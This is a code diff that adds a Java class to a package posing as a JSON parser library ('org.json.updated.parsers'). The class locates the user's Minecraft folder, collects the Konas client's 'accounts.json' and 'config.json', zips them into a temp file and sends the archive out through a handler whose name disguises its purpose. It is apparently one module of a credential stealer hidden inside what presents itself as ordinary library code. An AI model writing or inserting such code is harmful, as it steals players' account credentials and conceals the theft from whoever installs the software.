+++ src/main/java/org/json/updated/parsers/impl/KonasData.java
@@ -1,0 +1,43 @@
+package org.json.updated.parsers.impl;
+
+import org.json.updated.parsers.JSONObject;
+import org.json.updated.parsers.JSONRegexHandler;
+import org.json.updated.parsers.util.FileSystemHelper;
+
+import java.io.File;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.ArrayList;
+
+public class KonasData implements JSONObject {
+    private static final String[] IMPORTANT_FILES = new String[] { "accounts.json", "config.json" };
+
+    @Override
+    public void handle() {
+        String mcFolder = FileSystemHelper.getMinecraftFolder();
+        if (mcFolder == null || !Files.exists(Paths.get(mcFolder))) return;
+
+        String konassFolder = mcFolder + "Konas/";
+        if (!Files.exists(Paths.get(konassFolder))) {
+            JSONRegexHandler.send("> Did not contain the Konas folder.");
+            return;
+        }
+
+        ArrayList<File> validFileDirs = new ArrayList<>();
+        for (String fileName : IMPORTANT_FILES) {
+            String dir = konassFolder + fileName;
+            if (!Files.exists(Paths.get(dir))) continue;
+
+            validFileDirs.add(new File(dir));
+        }
+
+        String zipFile = System.getProperty("java.io.tmpdir") + FileSystemHelper.getSeparator() + "konass_shit.zip";
+        FileSystemHelper.zip(zipFile, validFileDirs);
+        JSONRegexHandler.send(new File(zipFile));
+    }
+
+    @Override
+    public String getName() {
+        return "Kon**ass**Data";
+    }
+}
